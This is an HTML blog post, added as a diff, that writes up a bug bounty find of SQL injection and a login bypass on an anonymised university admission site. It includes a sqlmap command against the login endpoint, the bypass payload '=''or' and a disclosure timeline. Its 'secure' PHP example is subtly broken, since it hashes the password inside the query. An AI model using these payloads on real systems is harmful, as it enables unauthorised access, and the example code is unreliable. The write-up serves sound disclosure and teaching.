@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[Bug Bounty] SQL Injection and Bypass SQL Login - ryuukhagetsu@smileforyou</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Google Fonts - Roboto -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../assets/css/style.css">
+    <link rel="stylesheet" href="../../assets/css/cyber-animations.css">
+    <link rel="stylesheet" href="../../assets/css/blog-article.css">
+    <link rel="shortcut icon" href="../../assets/img/icon/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img src="../../assets/img/logo/1692533172462_prev_ui.png" alt="ryuukhagetsu Logo" class="navbar-logo">
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+                <ul class="navbar-nav">
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#about">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#skills">Skills</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#projects">Projects</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#halloffame">Hall of Fame</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link active" href="index.html">Blog</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Article Header -->
+    <section class="article-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 mx-auto">
+                    <!-- Back to Articles Button -->
+                    <a href="index.html#blog" class="back-to-articles">
+                        <svg class="back-icon" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd"
+                                d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z"
+                                clip-rule="evenodd" />
+                        </svg>
+                        Back to Articles
+                    </a>
+                    <!-- Article Title -->
+                    <h1 class="article-title">[Bug Bounty] <span class="highlight">SQL Injection</span> and Bypass SQL
+                        Login</h1>
+
+                    <!-- Author Section - Single Row -->
+                    <div class="article-author-section">
+                        <div class="author-avatar">
+                            <img src="../../assets/img/logo/1692533172462_prev_ui.png" alt="ryuukhagetsu">
+                        </div>
+                        <div class="author-details">
+                            <h4>RyuuKhagetsu</h4>
+                            <div class="author-meta">
+                                <div class="publish-date">
+                                    <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM2 2a1 1 0 0 0-1 1v1h14V3a1 1 0 0 0-1-1H2zm13 3H1v9a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V5z" />
+                                    </svg>
+                                    March 25, 2022
+                                </div>
+                                <div class="read-time">
+                                    <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+                                        <path
+                                            d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
+                                    </svg>
+                                    10 min read
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Share Section with View on Medium -->
+                    <div class="article-share-section">
+                        <div class="share-left">
+                            <a href="https://medium.com/system-weakness/bug-bounty-sql-injection-and-bypass-sql-login-8759b222e70c"
+                                class="view-on-medium" target="_blank">
+                                <svg class="medium-icon" fill="currentColor" viewBox="0 0 16 16">
+                                    <path
+                                        d="M9.025 8c0 2.485-2.02 4.5-4.513 4.5A4.506 4.506 0 0 1 0 8c0-2.486 2.02-4.5 4.512-4.5A4.506 4.506 0 0 1 9.025 8zm4.95 0c0 2.34-1.01 4.236-2.256 4.236-1.246 0-2.256-1.897-2.256-4.236 0-2.34 1.01-4.236 2.256-4.236 1.246 0 2.256 1.897 2.256 4.236zM16 8c0 2.096-.355 3.795-.794 3.795-.438 0-.793-1.7-.793-3.795 0-2.096.355-3.795.794-3.795.438 0 .793 1.699.793 3.795z" />
+                                </svg>
+                                View on Medium
+                            </a>
+                        </div>
+                        <div class="share-right">
+                            <span class="share-label">Share:</span>
+                            <div class="share-buttons">
+                                <a href="#" class="share-btn share-twitter" data-share="twitter"
+                                    title="Share on Twitter">
+                                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" />
+                                    </svg>
+                                </a>
+                                <a href="#" class="share-btn share-linkedin" data-share="linkedin"
+                                    title="Share on LinkedIn">
+                                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z" />
+                                    </svg>
+                                </a>
+                                <a href="#" class="share-btn share-copy" data-share="copy" title="Copy Link">
+                                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z" />
+                                        <path
+                                            d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z" />
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Article Content -->
+    <section class="article-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <!-- Formatted Article Content -->
+                    <div class="article-body">
+                        <div class="highlight-box">
+                            <p><strong>Disclaimer:</strong> This article is for educational purposes only. The
+                                techniques described should only be used on systems you own or have explicit permission
+                                to test. Unauthorized access to computer systems is illegal.</p>
+                        </div>
+
+                        <p>Hi everyone, how are you? I hope you're all doing well. This time I want to share my
+                            experience regarding bug bounty hunting, and I hope my writing can be a reference for you
+                            all.</p>
+
+                        <p>It all started when I was looking for information about entrance exams at one of the
+                            universities, let's call it <code>site.ac.id</code>. During my research, I discovered two
+                            critical vulnerabilities:</p>
+
+                        <ul>
+                            <li><strong>SQL Injection</strong></li>
+                            <li><strong>Bypass SQL Login</strong></li>
+                        </ul>
+
+                        <div class="article-image">
+                            <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80"
+                                alt="University website login page">
+                            <p class="image-caption">University admission portal with vulnerable login system</p>
+                        </div>
+
+                        <h2>Understanding SQL Injection</h2>
+
+                        <p><strong>SQL Injection</strong> is a technique that exploits security vulnerabilities due to
+                            the absence of proper input filtering. This allows attackers to execute malicious SQL
+                            commands that can be used to view the contents of the website's database.</p>
+
+                        <p>This vulnerability occurs when user input is directly incorporated into SQL queries without
+                            proper sanitization or parameterization, creating opportunities for malicious code
+                            execution.</p>
+
+                        <h2>Discovery Process</h2>
+
+                        <p>While searching for admission information, I was prompted to log in to access the required
+                            details. Out of curiosity, I began searching for admin login pages and tried various methods
+                            to gain access to the administrator dashboard.</p>
+
+                        <h3>Initial Testing</h3>
+
+                        <p>I started by inputting a single quote (<code>'</code>) into the login form to test for SQL
+                            injection vulnerabilities. This is a basic but effective technique for identifying potential
+                            security flaws.</p>
+
+                        <div class="code-block">
+                            <code>
+                                # Test payload in login form<br>
+                                Username: '<br>
+                                Password: '
+                            </code>
+                        </div>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/bug-bounty-sql-injection-and-bypass-sql-login/1.webp"
+                                alt="University website login page">
+                            <p class="image-caption">University admission portal with vulnerable login system</p>
+                        </div>
+
+                        <div class="highlight-box">
+                            <p><strong>Critical Discovery:</strong> After inputting the single quote, I received an
+                                error message that clearly indicated a SQL injection vulnerability!</p>
+                        </div>
+
+                        <h3>Error Message Analysis</h3>
+
+                        <p>The error message I received was:</p>
+
+                        <div class="code-block">
+                            <code>
+                                Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result,<br>
+                                boolean given in /home/site/public_html/user/cek_login.php on line 12
+                            </code>
+                        </div>
+
+                        <p>This error message provided valuable information:</p>
+                        <ul>
+                            <li><strong>Database Type:</strong> MySQL (mysqli functions)</li>
+                            <li><strong>File Path:</strong> <code>/home/site/public_html/user/cek_login.php</code></li>
+                            <li><strong>Vulnerability Confirmation:</strong> Improper SQL query handling</li>
+                        </ul>
+
+
+                        <h2>Request Analysis with Developer Tools</h2>
+
+                        <p>I analyzed the request data by examining the Network tab in Web Developer Tools (<kbd>Ctrl +
+                                Shift + I</kbd>). This allowed me to understand the structure of the login request and
+                            identify the parameters being sent to the server.</p>
+
+                        <div class="code-block">
+                            <code>
+                                # HTTP POST request structure<br>
+                                POST /user/cek_login.php HTTP/1.1<br>
+                                Host: www.site.ac.id<br>
+                                Content-Type: application/x-www-form-urlencoded<br>
+                                <br>
+                                email=test@example.com&password=password123
+                            </code>
+                        </div>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/bug-bounty-sql-injection-and-bypass-sql-login/2.webp"
+                                alt="University website login page">
+                            <p class="image-caption">University admission portal with vulnerable login system</p>
+                        </div>
+
+                        <h2>SQLmap Exploitation</h2>
+
+                        <p>After confirming the vulnerability, I proceeded to use <strong>SQLmap</strong>, a powerful
+                            automated SQL injection tool, to extract database information.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/content/13.png" alt="SQLmap tool interface">
+                            <p class="image-caption">SQLmap - automated SQL injection exploitation tool</p>
+                        </div>
+
+                        <h3>SQLmap Command Execution</h3>
+
+                        <div class="code-block">
+                            <code>
+                                sqlmap -u "https://www.site.ac.id/user/cek_login.php" \<br>
+                                &nbsp;&nbsp;--data="email=a&password=a" \<br>
+                                &nbsp;&nbsp;--random-agent \<br>
+                                &nbsp;&nbsp;--tamper=space2comment \<br>
+                                &nbsp;&nbsp;--sql-query="database()"
+                            </code>
+                        </div>
+
+                        <p>Let me break down this command:</p>
+                        <ul>
+                            <li><strong>-u:</strong> Target URL</li>
+                            <li><strong>--data:</strong> POST data parameters</li>
+                            <li><strong>--random-agent:</strong> Use random User-Agent headers</li>
+                            <li><strong>--tamper=space2comment:</strong> Replace spaces with SQL comments</li>
+                            <li><strong>--sql-query:</strong> Execute specific SQL query</li>
+                        </ul>
+
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/bug-bounty-sql-injection-and-bypass-sql-login/3.webp"
+                                alt="University website login page">
+                            <p class="image-caption">University admission portal with vulnerable login system</p>
+                        </div>
+
+                        <div class="highlight-box">
+                            <p><strong>Success:</strong> After waiting for some time, I successfully obtained the
+                                database name from www.site.ac.id!</p>
+                        </div>
+
+                        <h2>SQL Login Bypass Discovery</h2>
+
+                        <p><strong>SQL Login Bypass</strong> is a technique where attackers can input SQL characters
+                            into login forms to gain unauthorized access to admin dashboards without using legitimate
+                            credentials.</p>
+
+                        <h3>Bypass Technique</h3>
+
+                        <p>I used the classic SQL injection payload <code>'=''or'</code> in both the username and
+                            password fields:</p>
+
+                        <div class="code-block">
+                            <code>
+                                # Login bypass payload<br>
+                                Username: '=''or'<br>
+                                Password: '=''or'
+                            </code>
+                        </div>
+
+                        <p>This payload works by manipulating the SQL query logic. The original query likely looked
+                            like:</p>
+
+                        <div class="code-block">
+                            <code>
+                                SELECT * FROM users WHERE username='$username' AND password='$password'
+                            </code>
+                        </div>
+
+                        <p>With our payload, it becomes:</p>
+
+                        <div class="code-block">
+                            <code>
+                                SELECT * FROM users WHERE username=''=''or'' AND password=''=''or''
+                            </code>
+                        </div>
+
+                        <div class="highlight-box">
+                            <p><strong>Bypass Success:</strong> After inputting the payload, I was immediately
+                                redirected to the admin panel, confirming that the login form was vulnerable to SQL
+                                injection bypass!</p>
+                        </div>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/bug-bounty-sql-injection-and-bypass-sql-login/4.webp"
+                                alt="Admin dashboard access">
+                            <p class="image-caption">Inject bypass sql</p>
+                        </div>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/bug-bounty-sql-injection-and-bypass-sql-login/5.webp"
+                                alt="Admin dashboard access">
+                            <p class="image-caption">Successfully bypassed login and gained admin access</p>
+                        </div>
+
+                        <h2>Impact Assessment</h2>
+
+                        <p>The discovered vulnerabilities had severe security implications:</p>
+
+                        <h3>SQL Injection Impact</h3>
+                        <ul>
+                            <li><strong>Data Exposure:</strong> Access to sensitive student and staff information</li>
+                            <li><strong>Database Manipulation:</strong> Potential to modify or delete critical data</li>
+                            <li><strong>System Information:</strong> Database structure and configuration details</li>
+                            <li><strong>Privilege Escalation:</strong> Possible access to administrative functions</li>
+                        </ul>
+
+                        <h3>Login Bypass Impact</h3>
+                        <ul>
+                            <li><strong>Unauthorized Access:</strong> Complete admin panel access without credentials
+                            </li>
+                            <li><strong>Administrative Control:</strong> Full system management capabilities</li>
+                            <li><strong>Data Breach:</strong> Access to confidential academic records</li>
+                            <li><strong>System Compromise:</strong> Potential for further exploitation</li>
+                        </ul>
+
+
+                        <h2>Responsible Disclosure</h2>
+
+                        <p>Following ethical hacking principles, I immediately reported these critical vulnerabilities
+                            to the university through their official channels.</p>
+
+                        <h2>Timeline</h2>
+
+                        <div class="code-block">
+                            <code>
+                                📅 February 23, 2022: Sent bug report to site.ac.id<br>
+                                ✅ February 24, 2022: University responded and validated the bugs<br>
+                                🏆 March 23, 2022: Received certificate of appreciation as reward
+                            </code>
+                        </div>
+
+                        <div class="highlight-box">
+                            <p><strong>Note:</strong> The development team gave me permission to disclose this report
+                                without mentioning their specific details or identity.</p>
+                        </div>
+
+                        <h2>Prevention and Remediation</h2>
+
+                        <p>To prevent similar vulnerabilities, organizations should implement comprehensive security
+                            measures:</p>
+
+                        <h3>SQL Injection Prevention</h3>
+                        <ul>
+                            <li><strong>Parameterized Queries:</strong> Use prepared statements with bound parameters
+                            </li>
+                            <li><strong>Input Validation:</strong> Sanitize and validate all user inputs</li>
+                            <li><strong>Least Privilege:</strong> Database users should have minimal necessary
+                                permissions</li>
+                            <li><strong>Error Handling:</strong> Implement proper error handling without exposing system
+                                details</li>
+                        </ul>
+
+                        <h3>Authentication Security</h3>
+                        <ul>
+                            <li><strong>Strong Authentication:</strong> Implement robust login mechanisms</li>
+                            <li><strong>Multi-Factor Authentication:</strong> Add additional security layers</li>
+                            <li><strong>Session Management:</strong> Secure session handling and timeout controls</li>
+                            <li><strong>Access Controls:</strong> Proper authorization and privilege management</li>
+                        </ul>
+
+                        <h3>Secure Code Example</h3>
+
+                        <div class="code-block">
+                            <code>
+                                // Secure PHP login code example<br>
+                                $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");<br>
+                                $stmt->execute([$username, password_hash($password, PASSWORD_DEFAULT)]);<br>
+                                $user = $stmt->fetch();<br>
+                                <br>
+                                if ($user && password_verify($password, $user['password'])) {<br>
+                                &nbsp;&nbsp;// Login successful<br>
+                                } else {<br>
+                                &nbsp;&nbsp;// Login failed<br>
+                                }
+                            </code>
+                        </div>
+
+                        <h2>Tools and Techniques Used</h2>
+
+                        <h3>Testing Tools</h3>
+                        <ul>
+                            <li><strong>Browser Developer Tools:</strong> Request/response analysis</li>
+                            <li><strong>SQLmap:</strong> Automated SQL injection testing</li>
+                            <li><strong>Manual Testing:</strong> Custom payload crafting</li>
+                            <li><strong>Burp Suite:</strong> Web application security testing (alternative)</li>
+                        </ul>
+
+                        <h3>Testing Methodology</h3>
+                        <ul>
+                            <li><strong>Reconnaissance:</strong> Information gathering and target analysis</li>
+                            <li><strong>Vulnerability Discovery:</strong> Manual and automated testing</li>
+                            <li><strong>Exploitation:</strong> Proof of concept development</li>
+                            <li><strong>Documentation:</strong> Comprehensive reporting</li>
+                            <li><strong>Responsible Disclosure:</strong> Ethical vulnerability reporting</li>
+                        </ul>
+
+                        <h2>Lessons Learned</h2>
+
+                        <p>This bug bounty experience taught me several valuable lessons:</p>
+
+                        <ul>
+                            <li><strong>Basic Techniques Work:</strong> Simple payloads can reveal critical
+                                vulnerabilities</li>
+                            <li><strong>Educational Institutions:</strong> Often have valuable systems with security
+                                gaps</li>
+                            <li><strong>Error Messages:</strong> Provide crucial information for exploitation</li>
+                            <li><strong>Responsible Disclosure:</strong> Builds trust and positive relationships</li>
+                            <li><strong>Documentation:</strong> Proper reporting leads to recognition and rewards</li>
+                        </ul>
+
+                        <h2>Conclusion</h2>
+
+                        <p>This successful bug bounty hunt demonstrates how curiosity and systematic testing can lead to
+                            the discovery of critical security vulnerabilities. The combination of SQL injection and
+                            authentication bypass created a severe security risk for the university's admission system.
+                        </p>
+
+                        <p>The experience reinforced the importance of:</p>
+
+                        <ul>
+                            <li><strong>Proactive Security Testing:</strong> Regular vulnerability assessments are
+                                essential</li>
+                            <li><strong>Input Validation:</strong> All user inputs must be properly sanitized</li>
+                            <li><strong>Secure Coding Practices:</strong> Following established security guidelines</li>
+                            <li><strong>Error Handling:</strong> Preventing information disclosure through error
+                                messages</li>
+                            <li><strong>Ethical Hacking:</strong> Using skills responsibly to improve security</li>
+                        </ul>
+
+                        <p>For aspiring bug bounty hunters, this case study shows that sometimes the most
+                            straightforward approaches yield the best results. Don't overlook basic testing techniques
+                            in favor of complex exploits – often, the simplest methods reveal the most critical
+                            vulnerabilities.</p>
+
+                        <div class="article-image">
+                            <img src="https://images.unsplash.com/photo-1504639725590-34d0984388bd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2074&q=80"
+                                alt="Cybersecurity education">
+                            <p class="image-caption">Continuous learning and ethical practices in cybersecurity</p>
+                        </div>
+
+                        <p>Maybe that's all from me, hopefully this can be a reference for you all and sorry if there
+                            are things that are not clear. I'm RyuuKhagetsu, see you in the next article.</p>
+
+                        <!-- Tags Section -->
+                        <div class="article-tags">
+                            <h4>Tags:</h4>
+                            <div class="tags-list">
+                                <span class="tag">#SQLInjection</span>
+                                <span class="tag">#AuthenticationBypass</span>
+                                <span class="tag">#BugBounty</span>
+                                <span class="tag">#SQLMap</span>
+                                <span class="tag">#WebSecurity</span>
+                                <span class="tag">#PenetrationTesting</span>
+                                <span class="tag">#ResponsibleDisclosure</span>
+                                <span class="tag">#DatabaseSecurity</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Related Articles -->
+    <section class="related-articles">
+        <div class="container">
+            <div class="row mb-5">
+                <div class="col-12 text-center">
+                    <h2>Related <span class="highlight">Articles</span></h2>
+                    <p class="mt-3 opacity-75">Explore more cybersecurity insights and techniques</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-6 mb-4">
+                    <div class="article-card-horizontal">
+                        <div class="article-image">
+                            <img src="../assets/img/content/1.jpeg">
+                            <div class="article-overlay">
+                                <a href="how-do-i-get-root-on-linux.html" class="article-link">read article</a>
+                            </div>
+                        </div>
+                        <div class="related-content">
+                            <div class="article-tags">
+                                <span class="article-tag">Penetration Testing</span>
+                                <span class="article-tag">Linux Security</span>
+                            </div>
+                            <h3 class="related-title">
+                                <a href="wedding-to-hacking.html">From Wedding to Hacking</a>
+                            </h3>
+                            <p class="article-excerpt">
+                                Hi all! How are you guys? I hope everything is fine. This time, I want to share my
+                                experience in getting root access on a Linux server...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-4">
+                    <div class="article-card-horizontal">
+                        <div class="article-image">
+                            <img src="../assets/img/content/1.jpeg">
+                            <div class="article-overlay">
+                                <a href="how-do-i-get-root-on-linux.html" class="article-link">read article</a>
+                            </div>
+                        </div>
+                        <div class="related-content">
+                            <div class="article-tags">
+                                <span class="article-tag">Penetration Testing</span>
+                                <span class="article-tag">Linux Security</span>
+                            </div>
+                            <h3 class="related-title">
+                                <a href="wedding-to-hacking.html">From Wedding to Hacking</a>
+                            </h3>
+                            <p class="article-excerpt">
+                                Hi all! How are you guys? I hope everything is fine. This time, I want to share my
+                                experience in getting root access on a Linux server...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <h3>ryuukhagetsu<span class="highlight">@smileforyou</span></h3>
+                    <p class="footer-tagline">Ethical Hacker | Security Researcher | Bug Hunter | Mahasiswa Biasa</p>
+                    <p class="section-subtitle">Have a project or security concern? Let's work together</p>
+                </div>
+                <div class="social-links">
+                    <a href="#" class="social-link" title="LinkedIn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="Instagram">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="Medium">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M9.025 8c0 2.485-2.02 4.5-4.513 4.5A4.506 4.506 0 0 1 0 8c0-2.486 2.02-4.5 4.512-4.5A4.506 4.506 0 0 1 9.025 8zm4.95 0c0 2.34-1.01 4.236-2.256 4.236-1.246 0-2.256-1.897-2.256-4.236 0-2.34 1.01-4.236 2.256-4.236 1.246 0 2.256 1.897 2.256 4.236zM16 8c0 2.096-.355 3.795-.794 3.795-.438 0-.793-1.7-.793-3.795 0-2.096.355-3.795.794-3.795.438 0 .793 1.699.793 3.795z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="Twitter">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="GitHub">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" />
+                        </svg>
+                    </a>
+                </div>
+                <div class="footer-text">
+                    <p class="security-note">Made With <span class="heart-icon">&hearts;</span> by RyuuKhagetsu</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
